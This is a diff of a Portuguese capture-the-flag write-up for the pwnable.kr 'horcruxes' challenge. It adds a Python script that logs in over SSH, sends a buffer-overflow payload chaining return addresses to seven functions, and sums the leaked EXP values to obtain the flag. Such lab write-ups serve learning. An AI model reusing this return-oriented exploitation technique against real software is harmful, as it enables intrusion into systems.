@@ -171,10 +171,119 @@ void init_ABCDEFG(void)
 Nessa função ```init_ABCDEFG``` não entendi muito seu proprosito, mas olhando com calma percebi que no final dela havia uma soma de todos os horcruxes no qual os valores de cada um eram definidos por ```/dev/urandom error```:
 ```sum = g + a + b + c + d + e + f;```
 
-Acredito que se eu achar o endereço de todas as horcruxes, somar elas, e exutar o Ropne de novo, possivelmente printaria a flag.
+Acredito que se eu achar o endereço de todas as horcruxes, somar elas, e executar o Ropme de novo, possivelmente printaria a flag.
 
 Como faremos isso?
 
-Bom, no programa ao ele perguntar pra gente o quanto de xp nos acumulamos e colocarmos a soma de todas as funções 
+Bom, no programa ao ele perguntar pra gente o quanto de xp nos acumulamos, no qual conseguimos ao acessar todas as funções, somando todos os EXPs de todos os horcruxes do Voldemort conseguimos a flag.
+Para conseguirmos usaremos esse ```payload```:
+```
+#!/usr/bin/env python3
+import paramiko
+import time
+from pwn import *
+
+# Configuração da conexão SSH
+host = "pwnable.kr"
+port = 2222
+username = "horcruxes"
+password = "guest"
+
+# Endereços das funções
+func_A_addr = 0x0809FE4B
+func_B_addr = 0x0809FE6A
+func_C_addr = 0x0809FE89
+func_D_addr = 0x0809FEA8
+func_E_addr = 0x0809FEC7
+func_F_addr = 0x0809FEE6
+func_G_addr = 0x0809FF05
+
+def ExtraExp(s):
+    keyword1 = 'EXP +'
+    keyword2 = 'EXP -'
+    
+    if keyword1 in s:
+        start = s.find(keyword1) + len(keyword1)
+    elif keyword2 in s:
+        start = s.find(keyword2) + len(keyword2)
+    else:
+        return 0  # Retorna 0 se a linha não tiver EXP
+    
+    end = s.find(')', start)
+    return int(s[start:end])
+
+
+# Conectar via SSH
+client = paramiko.SSHClient()
+client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+client.connect(host, port, username, password)
+
+# Abrir um shell interativo
+ssh_shell = client.invoke_shell()
+time.sleep(1)
+ssh_shell.send("./horcruxes\n")
+time.sleep(1)
+
+# Ler a saída inicial
+output = ssh_shell.recv(1024).decode()
+print(output)
+
+# Enviar opção "1" no menu
+ssh_shell.send("1\n")
+time.sleep(1)
+
+output = ssh_shell.recv(1024).decode()
+print(output)
+
+# Enviar payload
+payload = b'0' * 0x74 + b'\x00aaa' + p32(func_A_addr) + \
+                               p32(func_B_addr) + \
+                               p32(func_C_addr) + \
+                               p32(func_D_addr) + \
+                               p32(func_E_addr) + \
+                               p32(func_F_addr) + \
+                               p32(func_G_addr) + \
+                               p32(0x0809FFFC)
+
+ssh_shell.send(payload + b"\n")
+time.sleep(1)
+
+# Capturar saída das funções
+output = ssh_shell.recv(2048).decode("latin1", errors="ignore")
+print(output)
+
+# Extrair os valores EXP
+lines = output.split("\n")
+A = ExtraExp(lines[1])
+B = ExtraExp(lines[2])
+C = ExtraExp(lines[3])
+D = ExtraExp(lines[4])
+E = ExtraExp(lines[5])
+F = ExtraExp(lines[6])
+G = ExtraExp(lines[7])
+
+# Calcular soma
+Sum = (A + B + C + D + E + F + G) % (2 ** 32)
+if Sum > 0x7fffffff:
+    Sum -= 2 ** 32
+if Sum < 0x80000000 - 2 ** 32:
+    Sum += 2 ** 32
+
+# Enviar resposta final
+ssh_shell.send("1\n")
+time.sleep(1)
+
+ssh_shell.send(f"{Sum}\n")
+time.sleep(1)
+
+# Capturar a saída final
+output = ssh_shell.recv(1024).decode()
+print(output)
+
+# Fechar conexão
+client.close()
+```
+
+Nesse código eu cheguei muito perto
 >`[Insira a flag]`
 
